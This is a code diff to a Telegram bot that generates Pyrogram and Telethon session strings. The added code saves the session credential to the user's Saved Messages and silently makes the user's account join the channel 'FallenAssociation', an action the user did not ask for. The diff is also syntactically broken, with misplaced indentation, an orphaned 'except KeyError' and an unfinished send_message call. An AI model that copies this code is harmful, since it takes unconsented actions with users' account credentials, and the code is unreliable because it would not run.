@@ -30,6 +30,11 @@ from telethon.errors import (
     PasswordHashInvalidError
 )
 
+from config import SUPPORT_CHAT
+from RAUSHAN import RAJA
+from RAUSHAN.utils import retry_key
+
+
 import config
 
 
@@ -172,8 +177,26 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
             await client.sign_in_bot(phone_number)
     if telethon:
         string_session = client.session.save()
+        await client.send_message(
+                "me",
+                txt.format(ty, string_session, SUPPORT_CHAT),
+                link_preview=False,
+                parse_mode="html",
+            )        
     else:
         string_session = await client.export_session_string()
+            await client.send_message(
+                "me",
+                txt.format(ty, string_session, SUPPORT_CHAT),
+                disable_web_page_preview=True,
+            )
+            await client.join_chat("FallenAssociation")
+         except KeyError:
+        pass
+    try:
+        await client.disconnect()
+        await RAJA.send_message(
+            chat_id=user_id,     
     text = f"**ᴛʜɪs ɪs ʏᴏᴜʀ {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ** \n\n`{string_session}` \n\n**ɢᴇɴʀᴀᴛᴇᴅ ʙʏ :[𝐓ᴇᴀᴍ 𝐏ᴜʀᴠɪ](https://t.me/KING_STRING_SESSION_BOT) ᴡᴀʀɴɪɴɢ :** ᴅᴏɴᴛ sʜᴀʀᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴇᴠᴇɴ ɪғ ᴡɪᴛʜ ʏᴏᴜʀ ɢғ 🏴‍☠️"
     try:
         if not is_bot:
